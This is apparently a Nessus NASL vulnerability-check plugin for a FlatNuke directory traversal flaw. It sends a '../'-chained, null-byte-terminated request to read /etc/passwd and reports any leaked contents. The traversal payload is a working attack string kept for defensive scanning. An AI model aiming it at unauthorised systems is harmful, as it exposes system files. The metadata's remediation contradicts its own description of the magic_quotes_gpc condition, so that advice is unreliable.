#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20293);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2011/03/14 21:48:04 $");

  script_cve_id("CVE-2005-2813", "CVE-2005-4208");
  script_bugtraq_id(14702, 15796);
  script_osvdb_id(19118, 21749);

  script_name(english:"FlatNuke index.php id Parameter Traversal Arbitrary File Access");
  script_summary(english:"Checks for id parameter directory traversal vulnerability in FlatNuke");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
directory traversal vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote host is running FlatNuke, a content management system
written in PHP and using flat files rather than a database for its
storage. 

The version of FlatNuke installed on the remote host suffers fails to
remove directory traversal sequences user input to the 'id' parameter
of the 'index.php' script.  Provided PHP's 'magic_quotes_gpc' setting
is enabled, an attacker can leverage this flaw to read arbitrary files
on the remote host subject to the privileges of the web server user
id." );
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/flatnuke256_xpl.html" );
  script_set_attribute(attribute:"solution", value:
"Enable PHP's 'magic_quotes_gpc' setting." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/30");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/flatnuke", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../../../../etc/passwd";
  u = string(
      dir, "/?",
      "mod=read&",
      "id=", file, "%00"
    );
  r = http_send_recv3(port:port, method: "GET", item: u);
  if (isnull(r)) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string: r[2]))
  {
    output = strstr(r[2], 'read.png" alt="Read">&nbsp;');
    if (output) output = output - 'read.png" alt="Read">&nbsp;';
    if (output) output = output - strstr(output, '</font></td>');
    if (isnull(output)) output = r[2];

    report = '\n';
    foreach line (split(output, keep: 0))
      report = strcat(report, clean_string(s: line), '\n');
    security_warning(port:port, extra: report);
    exit(0);
  }
}
